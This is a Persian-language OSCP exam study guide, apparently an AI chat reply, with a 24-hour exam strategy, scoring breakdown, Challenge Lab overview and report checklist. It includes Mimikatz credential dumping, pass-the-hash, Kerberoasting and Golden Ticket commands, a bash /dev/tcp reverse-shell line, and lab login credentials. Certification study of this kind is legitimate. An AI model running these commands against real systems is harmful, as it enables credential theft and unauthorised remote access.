 بر اساس فایل Challenge Labs و تمام ماژول‌های قبلی، اینجا **راهنمای کامل آمادگی برای امتحان OSCP** رو برات آماده کردم:

---

## 🎯 نقشه راه کلی OSCP Exam

```
┌─────────────────────────────────────────────────────────────┐
│  فاز ۱: آمادگی قبل از امتحان (Pre-Exam)                      │
│  ├── تمام Capstone Exercises رو کامل کن                      │
│  ├── Assembling the Pieces Module رو بخون                  │
│  └── Challenge Labs 0-6 رو کار کن                            │
│       ├── 0-3: Scenarios (یادگیری تکنیک‌ها)                  │
│       └── 4-6: Mock Exams (شبیه‌سازی امتحان واقعی)          │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  فاز ۲: روز امتحان (Exam Day - 24 ساعت)                    │
│  ├── AD Set (40 امتیاز): 3 ماشین                            │
│  │   ├── Machine 1: 10 pts                                │
│  │   ├── Machine 2: 10 pts                                │
│  │   └── Machine 3: 20 pts (معمولاً DC)                    │
│  └── Standalone Machines (60 امتیاز): 3 ماشین              │
│       └── هر کدام: 20 pts (local + privilege escalation)   │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  فاز ۳: گزارش‌نویسی (24 ساعت بعد امتحان)                    │
│  └── مستندسازی حرفه‌ای با جزئیات کامل                      │
└─────────────────────────────────────────────────────────────┘
```

---

## 📋 چک‌لیست کامل قبل از امتحان

### ✅ تکنیک‌هایی که باید مسلط باشی

| دسته | تکنیک/ابزار | سطح اهمیت |
|------|-----------|----------|
| **Enumeration** | Nmap, Gobuster, Nikto, enum4linux | ⭐⭐⭐ حیاتی |
| | SNMP, SMB, LDAP enumeration | ⭐⭐⭐ حیاتی |
| | PowerView, SharpHound, BloodHound | ⭐⭐⭐ برای AD |
| **Exploitation** | Burp Suite, SQL Injection | ⭐⭐⭐ |
| | File Upload, LFI/RFI, Command Injection | ⭐⭐⭐ |
| | Kernel Exploits, SUID/SUDO abuse | ⭐⭐⭐ |
| **Post-Exploitation** | Mimikatz, Rubeus, CrackMapExec | ⭐⭐⭐ برای AD |
| | LinPEAS, WinPEAS (اما نه تکی!) | ⭐⭐ کمکی |
| **Lateral Movement** | Pass-the-Hash, Pass-the-Ticket | ⭐⭐⭐ حیاتی |
| | Kerberoasting, AS-REP Roasting | ⭐⭐⭐ |
| | Golden/Silver Ticket | ⭐⭐⭐ |
| | WMI, WinRM, PsExec, DCOM | ⭐⭐⭐ |
| **Tunneling/Pivoting** | SSH Port Forwarding (-L, -R, -D) | ⭐⭐⭐ |
| | Chisel (HTTP Tunneling) | ⭐⭐⭐ |
| | dnscat2 (DNS Tunneling) | ⭐⭐ |
| | Proxychains, sshuttle | ⭐⭐⭐ |

---

## 🎯 استراتژی روز امتحان (24 ساعت)

### ساعت 0-1: شروع و Enumeration کلی

```bash
# 1. VPN رو وصل کن و اتصال رو تست کن
ping <gateway>

# 2. تمام IPهای امتحان رو اسکن کن (AD + Standalone)
sudo nmap -sn <subnet>/24 -oN hosts-alive.txt

# 3. اسکن کامل روی همه ماشین‌های زنده
sudo nmap -sC -sV -p- --open -oN full-scan.txt <target-ips>

# 4. اسکن UDP سریع (فقط پورت‌های مهم)
sudo nmap -sU --top-ports 20 <target-ips>
```

**نکته طلایی:** اسکن اولیه کامل و دقیق باشه! 70% موفقیت در enumeration درسته.

---

### ساعت 1-8: حمله به Standalone Machines (ساده‌ترین‌ها)

**چرا اول Standalone؟**
- مستقل هستن (نیازی به AD نیست)
- سریع‌تر 20 امتیاز می‌گیری
- اعتماد به نفس می‌سازی

**روال برای هر Standalone:**

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Enumeration    │ ──► │  Exploitation   │ ──► │  Privilege Esc  │
│  (سرویس‌ها،     │     │  (آسیب‌پذیری     │     │  (sudo، SUID،   │
│  ورژن‌ها،       │     │  شناخته‌شده یا   │     │  kernel exploit،│
│  دایرکتوری‌ها)  │     │  custom exploit) │     │  token imperson)│
└─────────────────┘     └─────────────────┘     └─────────────────┘
        │                       │                       │
        ▼                       ▼                       ▼
   nmap -sC -sV           searchsploit            LinPEAS/WinPEAS
   gobuster dir           custom script           manual enum
   enum4linux             Burp Suite              Mimikatz (Windows)
```

---

### ساعت 8-20: حمله به AD Set (40 امتیاز - بسیار مهم!)

**ساختار AD در امتحان:**
```
┌─────────────────────────────────────────┐
│           Eric.Wallows                  │
│    (Assumed Breach - داریش!)            │
│         Password: EricLikesRunning800   │
└─────────────────┬───────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────┐
│      Machine 1 (10 pts)               │
│      - احتمالاً Client یا Workstation │
│      - از creds اولیه pivot کن         │
└─────────────────┬───────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────┐
│      Machine 2 (10 pts)               │
│      - احتمالاً Server داخلی          │
│      - lateral movement نیاز داره      │
└─────────────────┬───────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────┐
│      Machine 3 (20 pts) - DC           │
│      - Domain Controller               │
│      - هدف: Domain Admin               │
└─────────────────────────────────────────┘
```

**دستورات کلیدی AD:**

```powershell
# 1. شروع با creds داده شده
xfreerdp /u:Eric.Wallows /p:EricLikesRunning800 /v:<target-ip>

# 2. Enumeration سریع
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser | select cn
Get-NetGroup | select cn
Get-NetComputer | select operatingsystem,dnshostname

# 3. پیدا کردن مسیر حمله
Find-LocalAdminAccess
Get-NetSession -ComputerName <target>
Get-NetUser -SPN  # برای Kerberoasting

# 4. اگر Local Admin شدی → Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 5. اگر hash گرفتی → Pass-the-Hash
impacket-wmiexec -hashes :<NTLM-hash> Administrator@<target>

# 6. اگر SPN دیدی → Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt

# 7. اگر krbtgt hash گرفتی → Golden Ticket
kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash> /ptt
```

---

### ساعت 20-24: جمع‌بندی و گرفتن امتیازات باقی‌مانده

- برگرد به ماشین‌هایی که نشد
- Screenshot بگیر (مهم برای گزارش!)
- Flagها رو ثبت کن
- یادداشت‌هات رو مرتب کن

---

## ⚠️ نکات بحرانی امتحان

### ✅ Do's (انجام بده)

| نکته | توضیح |
|------|-------|
| **Screenshot بگیر** | هر دستور مهم، هر فلگ، هر shell جدید |
| **یادداشت‌برداری کن** | از دقیقه اول شروع کن |
| **Backup بگیر** | اسکریپت‌ها و exploitهایی که نوشتی |
| **تایمر بذار** | حداکثر 2-3 ساعت روی یک ماشین بمان |
| **روش‌های جایگزین داشته باش** | اگر exploit یکی کار نکرد، برو سراغ بعدی |
| **Metasploit محدود استفاده کن** | فقط روی یک ماشین (بهتره نگهش داری برای emergency) |

### ❌ Don'ts (انجام نده)

| نکته | توضیح |
|------|-------|
| **Brute Force طولانی** | بیشتر از 10 دقیقه کرک نکن |
| **DOS/DDOS** | فایروال رو خراب می‌کنی |
| **تکی به LinPEAS/WinPEAS** | فقط کمکی، manual enum اولویت |
| **گیر کردن روی یک ماشین** | اگر 2 ساعت گیر کردی، برو ماشین دیگه |
| **فراموش کردن گزارش** | از دقیقه اول مستندسازی کن |

---

## 📊 امتیازدهی و Passing Score

```
┌────────────────────────────────────────┐
│  Passing Score: 70 امتیاز            │
├────────────────────────────────────────┤
│  AD Set: 40 pts                        │
│  ├── Machine 1: 10 pts                │
│  ├── Machine 2: 10 pts                │
│  └── Machine 3: 20 pts                │
├────────────────────────────────────────┤
│  Standalone: 60 pts (3 × 20)           │
│  ├── هر کدام: 10 pts (local.txt)       │
│  └── هر کدام: 10 pts (proof.txt)       │
├────────────────────────────────────────┤
│  Bonus Points: 5 pts                   │
│  └── گزارش کامل و حرفه‌ای              │
└────────────────────────────────────────┘

استراتژی‌های رسیدن به 70:
├── 40 pts AD + 30 pts Standalone (2 کامل + 1 local)
├── 40 pts AD + 20 pts Standalone (1 کامل) + 10 pts (local)
└── 40 pts AD + 10 pts (1 local) + Bonus 5 + 15 pts (3 local دیگه)
```

---

## 🛠️ ابزارهای ضروری که باید آماده داشته باشی

### روی Kali

```bash
# Enumeration
nmap, nikto, gobuster, enum4linux, snmpwalk

# Exploitation
searchsploit, msfvenom, nc, socat

# Post-Exploitation
mimikatz, rubeus, crackmapexec, impacket-scripts

# Tunneling
chisel, ssh, proxychains, sshuttle

# Cracking
hashcat, john
```

### اسکریپت‌های آماده

```bash
# reverse shell generator
#!/bin/bash
ip="192.168.118.4"
port="443"
echo "bash -i >& /dev/tcp/$ip/$port 0>&1"

# python encoder for powershell
python3 -c "import base64; print(base64.b64encode(open('shell.ps1').read().encode('utf16')[2:]).decode())"
```

---

## 📝 گزارش‌نویسی (24 ساعت بعد امتحان)

### ساختار گزارش

```
1. Executive Summary
   ├── امتیاز کلی: X/100
   ├── ماشین‌های compromised
   └── روش کلی حمله

2. Methodology
   └── روش کلی تست نفوذ

3. Detailed Findings (برای هر ماشین)
   ├── Enumeration
   ├── Exploitation
   ├── Post-Exploitation
   ├── Privilege Escalation
   └── Proof (Screenshotها)

4. Appendices
   └── اسکریپت‌ها، دستورات کامل
```

### هر ماشین باید شامل:

- [ ] IP Address و hostname
- [ ] Screenshot از `local.txt`
- [ ] Screenshot از `proof.txt`
- [ ] دستورات دقیق exploitation
- [ ] دستورات privilege escalation
- [ ] Screenshot از `whoami` و `ipconfig/ifconfig`

---

## 🎯 چک‌لیست نهایی روز قبل امتحان

```
□ Kali به‌روز شده
□ VPN pack امتحان دانلود شده و تست شده
□ اسکریپت‌های شخصی آماده
□ Wordlistهای مهم آماده (rockyou, fasttrack, etc.)
□ Screenshot tool آماده (flameshot, gnome-screenshot)
□ Note-taking tool آماده (cherrytree, obsidian, یا حتی text ساده)
□ قهوه و تنقلات آماده 😄
□ 48 ساعت آزاد در تقویم
□ خواب کافی شب قبل
```

---

## 🔥 جملات کلیدی "Try Harder"

| وقتی... | بگو/بکن |
|--------|---------|
| گیر کردی | "There is always a way" |
| خسته شدی | 10 دقیقه استراحت، آب بخور |
| exploit کار نکرد | ورژن رو چک کن، پارامترها رو بررسی کن |
| هیچ سرویسی ندیدی | UDP scan بزن، ICMP رو چک کن |
| AD گیج‌کننده بود | BloodHound بزن، نقشه بکش |
| وقت داری کم میشه | روی low-hanging fruit تمرکز کن |

---

---

---

---

---


 بله، در فایل‌هایی که فرستادی (مخصوصاً فایل آخر با عنوان "logo Penetration Tes.txt") اطلاعات کاملی درباره **نحوه حل Challenge Labs** وجود داره. اجازه بده خلاصه‌اش رو برات توضیح بدم:

## ساختار کلی Challenge Labs

| شماره | نام | نوع | هدف |
|-------|-----|-----|-----|
| **0-3** | Secura, Medtech, Relia, Skylark | **Scenarios** | شبکه‌های واقعی با داستان، هدف نهایی: Domain Admin |
| **4-6** | OSCP A, B, C | **Mock Exams** | شبیه‌سازی دقیق آزمون OSCP+ |
| **7-10** | Zeus, Poseidon, Feast, Laser | **Advanced** | سخت‌تر از آزمون، برای PEN-300 |

---

## نکات کلیدی برای حل کردن

### 🔴 **قبل از شروع (خیلی مهم!)**
1. **همه Capstone Exercises رو تموم کن** - نرید سراغ Challenge Labs تا Module exercises رو نزدید
2. **Module "Assembling the Pieces" رو بخونید** - چارچوب متدولوژیک برای حمله به شبکه‌های بزرگ
3. **برای Challenge 0 و 7-10** از این credential شروع کنید:
   - **Username:** `Eric.Wallows`
   - **Password:** `EricLikesRunning800`

### 🎯 **رویکرد برای Challenge 0-3 (Scenarios)**
- هر کدوم یه داستان و شبکه دارن
- هدف: **Domain Admin** بگیرید و هرچی ماشین می‌تونید compromise کنید
- Challenge 0 (Secura) ساده‌تره و ramp-up هست
- Challenge 3 (Skylark) **خیلی سخت‌تر** از 0-2 هست و beyond scope آزمون OSCP

### 📝 **رویکرد برای Challenge 4-6 (Mock Exams)**
اینا دقیقاً شبیه آزمون OSCP+ هستن:
- **3 تا ماشین Standalone** (هر کدوم 20 امتیاز = 60 کل)
- **1 ست AD با 3 ماشین** (40 امتیاز کل)
- **برای AD** از credential بالا استفاده کنید (Assumed Breach)
- **Standaloneها** dependency ندارن - هر کدوم جدا هستن

> **توصیه مهم:** تایمر بذارید ولی لزوماً 24 ساعت نیازی نیست. اول 24 ساعت ببینید چقدر پیش می‌رید، بعد تحلیل کنید.

---

## نکات فنی مهم

### 1. **Machine Dependencies (وابستگی ماشین‌ها)**
- بعضی ماشین‌ها رو نمی‌تونید بدون اطلاعات از ماشین دیگه‌ای hack کنید
- مثال: ماشین VANGUARD فایلی داره که credential ماشین SENTINEL رو لو میده
- **Student Mentors نمی‌گن** کدوم وابسته هست - خودتون باید کشف کنید
- **بین Challengeها dependency نیست** (اطلاعات Challenge 1 به 2 ربط نداره)

### 2. **Client-Side Simulations**
- تو شبکه VPN clientهای شبیه‌سازی شده هستن
- هر 3 دقیقه یه بار activity انجام میدن
- راهنماهای ظریح تو lab کمکتون می‌کنه پیداشون کنید

### 3. **Routers/NAT**
- هر Challenge چند subnet داره (external + internal)
- internal از external مستقیم routable نیست
- باید pivoting کنید (dual-homed hosts, client-side exploits)
- **Brute force/DoS ممنوع** - firewall رو خراب می‌کنه

### 4. **Password Cracking**
- اگه wordlistهای Kali رو امتحان کردید و نشد، برید سراغ vector دیگه
- با سخت‌افزار معمولی، هر vector عمدی باید **زیر 10 دقیقه** کرک بشه

---

## تفاوت Challenge Labs با آزمون واقعی

| ویژگی | Challenge Labs 0-3, 7-10 | Challenge 4-6 | آزمون OSCP+ |
|--------|------------------------|---------------|-------------|
| ماشین‌های غیرقابل hack | ✅ داره | ❌ نداره | ❌ نداره |
| Privilege Escalation همیشه ممکن | ❌ نه | ✅ بله | ✅ بله |
| Metasploit محدودیت | ❌ نداره | ✅ محدود | ✅ محدود |
| Proctoring | ❌ نداره | ❌ نداره | ✅ داره |

---

## نکات مربوط به Metasploit

- **تو Challenge Labs 0-3** آزادانه استفاده کنید - یادگیری مهمه
- **تو Challenge 4-6** می‌تونید محدودیت خودتون بذارید (اختیاری)
- **تو آزمون واقعی:**
  - فقط **یک ماشین** می‌تونید از Metasploit modules استفاده کنید
  - Meterpreter هم فقط روی **یک ماشین**
  - `msfvenom` و `multi/handler` روی همه مجاز هست
  - Pivoting با Metasploit ممنوع

---

## ابزارهای ممنوعه تو آزمون (و باید تو Challenge 4-6 تمرین کنید بدنشون)

- Spoofing (IP, ARP, DNS, etc)
- Commercial tools (Metasploit Pro, Burp Pro)
- Auto-exploitation (SQLmap, SQLninja, db_autopwn)
- Mass scanners (Nessus, OpenVAS, Nessus)
- **AI Chatbots** (ChatGPT, Gemini, etc) - **ممنوعه!**
- Discord برای کمک گرفتن - **ممنوعه!**

---

## خلاصه مسیر پیشنهادی

1. **تموم کنید:** همه Module exercises + Capstone exercises
2. **بخونید:** "Assembling the Pieces" Module
3. **شروع کنید:** Challenge 0 (Secura) - با credential Eric.Wallows
4. **ادامه بدید:** Challenge 1-3 (به ترتیب سختی)
5. **Mock Exam:** Challenge 4-6 (با تایمر، بدون کمک گرفتن)
6. **Advanced (اختیاری):** Challenge 7-10 (برای PEN-300)


| اولویت   | Challenge                 | دلیل                                    |
| -------- | ------------------------- | --------------------------------------- |
| **1**    | **Challenge 4 - OSCP A**  | شبیه‌سازی **دقیق** آزمون، باید اول بزنی |
| **2**    | **Challenge 5 - OSCP B**  | Mock Exam دوم، الگوهای جدید             |
| **3**    | **Challenge 6 - OSCP C**  | Mock Exam سوم، تثبیت مهارت              |
| **4**    | **Challenge 0 - Secura**  | Ramp-up سریع، Assumed Breach تمرین      |
| **5**    | **Challenge 1 - Medtech** | Scenario ساده‌تر از 2-3                 |
| **6**    | **Challenge 2 - Relia**   | Scenario پیچیده‌تر                      |
| **7**    | **Challenge 3 - Skylark** | **خیلی سخت، beyond scope آزمون**        |
| **8-11** | Challenge 7-10            | **PEN-300 level، فعلاً نمی‌رسه**        |

